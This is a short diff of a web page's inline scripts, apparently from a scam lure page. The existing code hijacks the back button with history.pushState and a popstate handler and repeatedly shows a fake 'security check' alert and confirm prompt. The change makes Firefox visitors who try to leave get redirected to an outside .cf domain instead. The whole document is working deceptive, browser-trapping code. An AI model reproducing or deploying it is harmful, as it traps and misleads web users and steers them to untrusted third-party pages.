@@ -12,7 +12,7 @@
     window.onunload=function(){ void (0) };
 </script>
 
-<script type='text/javascript'> setTimeout(function back() { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); if(navigator.userAgent.match(/firefox|fxios/i)){ if (typeof code_happened === 'undefined') { window.code_happened = true; alert('One more step | Please complete security check to continue !'); } } else { alert('One more step | Please complete security check to continue !'); setTimeout(function scroll() { window.scrollTo(0, 0); }, 0); }; }); }, 500) </script>
+<script type='text/javascript'> setTimeout(function back() { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); if(navigator.userAgent.match(/firefox|fxios/i)){ location.assign('https://redirect.homesite.cf/demo5.html'); } else { alert('One more step | Please complete security check to continue !'); setTimeout(function scroll() { window.scrollTo(0, 0); }, 0); }; }); }, 500) </script>
 
 <script> window.addEventListener("load", function() { setTimeout(function alert() { if (confirm("One more step | Please complete security check to continue !")) { } else { } }, 500) }); </script>
 
